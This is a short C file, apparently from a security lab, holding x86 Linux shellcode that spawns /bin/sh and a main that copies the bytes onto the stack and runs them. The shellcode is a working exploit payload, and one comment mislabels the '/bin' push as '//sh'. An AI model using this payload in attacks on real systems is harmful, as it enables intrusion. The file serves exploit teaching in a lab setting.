/* call_shellcode.c: You can get it from the lab's website */
  
/* A program that launches a shell using shellcode */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
  "\x31\xc0"         /* Line 1:  xor  eax, eax      */
  "\x50"             /* Line 2:  push eax           */
  "\x68""//sh"       /* Line 3:  push "//sh"        */
  "\x68""/bin"       /* Line 4:  push "//sh"        */
  "\x89\xe3"         /* Line 5:  mov  ebx, esp      */
  "\x50"             /* Line 6:  push eax           */
  "\x53"             /* Line 7:  push ebx           */
  "\x89\xe1"         /* Line 8:  mov  ecx, esp      */
  "\x31\xd2"         /* Line 9:  xor  edx, edx      */
  "\x31\xc0"         /* Line 10: xor  eax, eax      */
  "\xb0\x0b"         /* Line 11: mov  al,  0x0b     */
  "\xcd\x80"         /* Line 12: int  0x80          */
;

int main(int argc, char **argv)
{
   char buf[sizeof(shellcode)];
   strcpy(buf, shellcode);
   ((void(*)( ))buf)( );
}

